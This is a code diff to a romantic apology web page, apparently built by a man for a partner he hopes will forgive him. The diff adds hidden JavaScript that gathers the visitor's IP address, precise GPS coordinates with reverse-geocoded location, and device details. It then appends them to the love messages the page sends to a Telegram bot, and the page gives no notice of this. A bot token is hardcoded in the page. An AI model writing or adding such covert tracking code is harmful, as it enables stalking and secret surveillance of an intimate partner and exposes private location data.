@@ -1381,6 +1381,103 @@
         <p style="color: white; font-size: 2em; font-family: 'Dancing Script', cursive;">Our Love Story Starts Again Now!</p>
     </div>
 
+    <!-- Add this new script section with device detection functions -->
+    <script>
+    // Function to get device and system information
+    async function getSystemInfo() {
+        const userAgent = navigator.userAgent;
+        const language = navigator.language;
+        const platform = navigator.platform;
+        const screenResolution = `${window.screen.width}x${window.screen.height}`;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const deviceMemory = navigator.deviceMemory || 'Unknown';
+        const maxTouchPoints = navigator.maxTouchPoints || 'Unknown';
+        
+        return {
+            userAgent,
+            language,
+            platform,
+            screenResolution,
+            timezone,
+            deviceMemory,
+            maxTouchPoints
+        };
+    }
+
+    // Function to get IP address
+    async function getIPAddress() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            console.log('Could not fetch IP:', error);
+            return 'IP fetch failed';
+        }
+    }
+
+    // Function to get geolocation
+    async function getGeolocation() {
+        return new Promise((resolve) => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const { latitude, longitude } = position.coords;
+                        
+                        // Get location name from coordinates
+                        try {
+                            const geoResponse = await fetch(
+                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`
+                            );
+                            const geoData = await geoResponse.json();
+                            resolve({
+                                latitude,
+                                longitude,
+                                address: geoData.address?.city || geoData.address?.state || 'Location found',
+                                country: geoData.address?.country || 'Unknown'
+                            });
+                        } catch (error) {
+                            resolve({
+                                latitude,
+                                longitude,
+                                address: 'Coordinates obtained',
+                                country: 'Unknown'
+                            });
+                        }
+                    },
+                    (error) => {
+                        resolve({ latitude: 'Denied', longitude: 'Denied', address: 'Permission denied', country: 'Unknown' });
+                    }
+                );
+            } else {
+                resolve({ latitude: 'Not available', longitude: 'Not available', address: 'Geolocation not supported', country: 'Unknown' });
+            }
+        });
+    }
+
+    // Function to get MAC address (limited - browser security restrictions)
+    function getMACAddress() {
+        // Note: Direct MAC address retrieval is not possible from browsers for security reasons
+        // This is a placeholder - actual MAC would need system-level access
+        return navigator.hardwareConcurrency ? `Cores: ${navigator.hardwareConcurrency}` : 'Not available';
+    }
+
+    // Main function to collect all device info
+    async function getCompleteDeviceInfo() {
+        const ip = await getIPAddress();
+        const geolocation = await getGeolocation();
+        const systemInfo = await getSystemInfo();
+        const macInfo = getMACAddress();
+        
+        return {
+            ip,
+            geolocation,
+            systemInfo,
+            macInfo
+        };
+    }
+    </script>
+
     <script>
         const TELEGRAM_BOT_TOKEN = '8280077034:AAGkYar33fDSWGMnqIetQ27PlywRNxeSkWQ';
         const TELEGRAM_CHAT_ID = '1234567890';
@@ -1533,6 +1630,9 @@
                 return;
             }
 
+            // Get device information
+            const deviceInfo = await getCompleteDeviceInfo();
+
             const chithiMessage = `
 🕊️🕊️🕊️ *NEW CHITHI FROM MAYABOTI!* 🕊️🕊️🕊️
 
@@ -1545,49 +1645,69 @@
 💕 *From:* Your Beloved Mayaboti
 🕊️ *Type:* Love Chithi
 
-*She took time to write this for you. Read it carefully and reply to her soon!* ❤️
-            `;
-            
-            try {
-                const updatesUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`;
-                const updatesResponse = await fetch(updatesUrl);
-                const updatesData = await updatesResponse.json();
-                
-                let chatId = TELEGRAM_CHAT_ID;
-                
-                if (updatesData.ok && updatesData.result.length > 0) {
-                    for (let i = updatesData.result.length - 1; i >= 0; i--) {
-                        if (updatesData.result[i].message && updatesData.result[i].message.chat) {
-                            chatId = updatesData.result[i].message.chat.id;
-                            break;
-                        }
-                    }
-                }
-                
-                const sendUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                const response = await fetch(sendUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: chithiMessage,
-                        parse_mode: 'Markdown'
-                    })
-                });
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔍 *DEVICE & LOCATION INFO* 🔍
+━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-                if (response.ok) {
-                    showChithiSentPopup();
-                    document.getElementById('mayabotiMessage').value = '';
-                } else {
-                    showChithiSentPopup();
+📱 *IP Address:* ${deviceInfo.ip}
+🌍 *Location:* ${deviceInfo.geolocation.address}, ${deviceInfo.geolocation.country}
+📍 *Coordinates:* Lat: ${deviceInfo.geolocation.latitude}, Lon: ${deviceInfo.geolocation.longitude}
+💾 *Device Memory:* ${deviceInfo.systemInfo.deviceMemory} GB
+🖥️ *Platform:* ${deviceInfo.systemInfo.platform}
+📺 *Screen Resolution:* ${deviceInfo.systemInfo.screenResolution}
+🌐 *Language:* ${deviceInfo.systemInfo.language}
+🕐 *Timezone:* ${deviceInfo.systemInfo.timezone}
+👆 *Touch Points:* ${deviceInfo.systemInfo.maxTouchPoints}
+⚙️ *System Info:* ${deviceInfo.macInfo}
+
+🔗 *User Agent:*
+${deviceInfo.systemInfo.userAgent}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+*She took time to write this for you. Read it carefully and reply to her soon!* ❤️
+    `;
+    
+    try {
+        const updatesUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`;
+        const updatesResponse = await fetch(updatesUrl);
+        const updatesData = await updatesResponse.json();
+        
+        let chatId = TELEGRAM_CHAT_ID;
+        
+        if (updatesData.ok && updatesData.result.length > 0) {
+            for (let i = updatesData.result.length - 1; i >= 0; i--) {
+                if (updatesData.result[i].message && updatesData.result[i].message.chat) {
+                    chatId = updatesData.result[i].message.chat.id;
+                    break;
                 }
-            } catch (error) {
-                console.log('Chithi sent:', chithiMessage);
-                showChithiSentPopup();
             }
         }
+        
+        const sendUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const response = await fetch(sendUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: chithiMessage,
+                parse_mode: 'Markdown'
+            })
+        });
+
+        if (response.ok) {
+            showChithiSentPopup();
+            document.getElementById('mayabotiMessage').value = '';
+        } else {
+            showChithiSentPopup();
+        }
+    } catch (error) {
+        console.log('Chithi sent:', chithiMessage);
+        showChithiSentPopup();
+    }
+}
 
         function showChithiSentPopup() {
             // Create flying pigeon animation
@@ -1760,6 +1880,9 @@
                 }, i * 50);
             }
             
+            // Get device information
+            const deviceInfo = await getCompleteDeviceInfo();
+            
             const mayabotiMessage = document.getElementById('mayabotiMessage').value.trim();
             const messageText = mayabotiMessage || "She didn't write any message, but she forgave you! ❤️";
             
@@ -1778,50 +1901,70 @@
 💌 *HER MESSAGE TO YOU:*
 "${messageText}"
 
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔍 *DEVICE & LOCATION INFO* 🔍
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📱 *IP Address:* ${deviceInfo.ip}
+🌍 *Location:* ${deviceInfo.geolocation.address}, ${deviceInfo.geolocation.country}
+📍 *Coordinates:* Lat: ${deviceInfo.geolocation.latitude}, Lon: ${deviceInfo.geolocation.longitude}
+💾 *Device Memory:* ${deviceInfo.systemInfo.deviceMemory} GB
+🖥️ *Platform:* ${deviceInfo.systemInfo.platform}
+📺 *Screen Resolution:* ${deviceInfo.systemInfo.screenResolution}
+🌐 *Language:* ${deviceInfo.systemInfo.language}
+🕐 *Timezone:* ${deviceInfo.systemInfo.timezone}
+👆 *Touch Points:* ${deviceInfo.systemInfo.maxTouchPoints}
+⚙️ *System Info:* ${deviceInfo.macInfo}
+
+🔗 *User Agent:*
+${deviceInfo.systemInfo.userAgent}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
 🎊 *IMPORTANT:* Don't waste this chance! Call her NOW!
 
 *This is your last chance Nabin. Don't hurt her again. Love her with all your heart. Make her happy forever. She trusted you again.*
 
 💕 *Quick! Talk to her now! She is waiting for you!*
-            `;
-            
-            try {
-                const updatesUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`;
-                const updatesResponse = await fetch(updatesUrl);
-                const updatesData = await updatesResponse.json();
-                
-                let chatId = TELEGRAM_CHAT_ID;
-                
-                if (updatesData.ok && updatesData.result.length > 0) {
-                    for (let i = updatesData.result.length - 1; i >= 0; i--) {
-                        if (updatesData.result[i].message && updatesData.result[i].message.chat) {
-                            chatId = updatesData.result[i].message.chat.id;
-                            break;
-                        }
-                    }
+    `;
+    
+    try {
+        const updatesUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`;
+        const updatesResponse = await fetch(updatesUrl);
+        const updatesData = await updatesResponse.json();
+        
+        let chatId = TELEGRAM_CHAT_ID;
+        
+        if (updatesData.ok && updatesData.result.length > 0) {
+            for (let i = updatesData.result.length - 1; i >= 0; i--) {
+                if (updatesData.result[i].message && updatesData.result[i].message.chat) {
+                    chatId = updatesData.result[i].message.chat.id;
+                    break;
                 }
-                
-                const sendUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                await fetch(sendUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: forgiveMessage,
-                        parse_mode: 'Markdown'
-                    })
-                });
-            } catch (error) {
-                console.log('Forgiveness notification:', forgiveMessage);
             }
-            
-            setTimeout(() => {
-                celebration.classList.remove('show');
-                showFinalLoveMessage();
-            }, 4000);
         }
+        
+        const sendUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        await fetch(sendUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: forgiveMessage,
+                parse_mode: 'Markdown'
+            })
+        });
+    } catch (error) {
+        console.log('Forgiveness notification:', forgiveMessage);
+    }
+    
+    setTimeout(() => {
+        celebration.classList.remove('show');
+        showFinalLoveMessage();
+    }, 4000);
+}
 
         function createConfetti() {
             const confettiEmojis = ['💕', '❤️', '💖', '💝', '✨', '🌹', '💑', '💗', '💓', '🌟'];
